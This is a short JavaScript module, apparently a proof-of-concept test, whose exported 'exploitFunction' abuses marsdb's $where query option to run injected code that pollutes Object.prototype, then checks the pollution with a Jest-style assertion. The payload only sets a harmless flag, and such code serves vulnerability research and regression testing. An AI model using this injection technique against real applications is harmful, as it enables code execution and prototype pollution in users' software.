function exploitFunction(payload) {
    let Collection = require("marsdb").Collection;
    const posts = new Collection("posts", { inMemory: true });

    return posts.insert({ text: payload.text }).then((docId) => {
        return posts
            .find({ $where: "(Object.prototype.polluted=`yes`)" })
            .then((docs) => {
                expect({}.polluted).toBe("yes");
            });
    });
}

module.exports = { exploitFunction };